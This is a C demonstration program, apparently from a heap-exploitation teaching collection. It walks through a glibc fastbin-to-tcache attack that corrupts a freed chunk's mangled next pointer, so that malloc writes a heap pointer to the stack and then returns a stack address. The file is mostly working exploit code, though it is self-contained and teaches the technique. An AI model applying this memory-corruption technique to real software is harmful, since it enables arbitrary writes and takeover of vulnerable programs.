#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	printf("\n"
		   "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
		   "except it works with a small allocation size (allocsize <= 0x78).\n"
		   "The goal is to set things up so that a call to malloc(allocsize) will write\n"
		   "a large unsigned value to the stack.\n\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n"
		   "An heap address leak is needed to perform this attack.\n"
		   "The same patch also ensures the chunk returned by tcache is properly aligned.\n\n");

	// Allocate 14 times so that we can free later.
	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}
	
	printf("First we need to free(allocsize) at least 7 times to fill the tcache.\n"
	  	   "(More than 7 times works fine too.)\n\n");
	
	// Fill the tcache.
	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];
	printf("The next pointer that we free is the chunk that we're going to corrupt: %p\n"
		   "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
		   "already full, it will go in the fastbin.\n\n", victim);
	free(victim);
	
	printf("Next we need to free between 1 and 6 more pointers. These will also go\n"
		   "in the fastbin. If we don't control the data on the stack,\n"
		   "then we need to free exactly 6 more pointers, otherwise the attack will\n"
		   "cause a segmentation fault when traversing the linked list.\n"
		   "But if we control at least 8-byte on the stack, we know where the stack is,\n"
		   "and we want to control more data on the stack, a single free is sufficient\n"
		   "by forging a mangled NULL on the stack to terminate list traversal.\n\n");
	
	// Fill the fastbin.
	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	// Create an array on the stack and initialize it with garbage.
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	
	printf("The stack address that we intend to target: %p\n"
		   "It's current value is %p\n", &stack_var[2], (char*)stack_var[2]);
	
	printf("Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
			"to overwrite the next pointer at address %p\n\n", victim);
	
	//------------VULNERABILITY-----------
	
	// Overwrite linked list pointer in victim.
	// The following operation assumes the address of victim is known, thus requiring
	// a heap leak.
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
	
	//------------------------------------
	
	printf("The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n");
	
	// Empty tcache.
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	
	printf("Let's just print the contents of our array on the stack now,\n"
			"to show that it hasn't been modified yet.\n\n");
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	printf("\n"
		   "The next allocation triggers the stack to be overwritten. The tcache\n"
		   "is empty, but the fastbin isn't, so the next allocation comes from the\n"
		   "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
		   "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
		   "address that we are targeting ends up being the first chunk in the tcache.\n"
		   "It contains a pointer to the next chunk in the list, which is why a heap\n"
		   "pointer is written to the stack.\n"
		   "\n"
		   "Earlier we said that the attack will also work if we free fewer than 6\n"
		   "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
		   "That's because the value on the stack is treated as a next pointer in the\n"
		   "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
		   "\n"
		   "The contents of our array on the stack now look like this:\n\n");
	
	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);
	printf("\n"
			"Finally, if we malloc one more time then we get the stack address back: %p\n", q);
	
	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
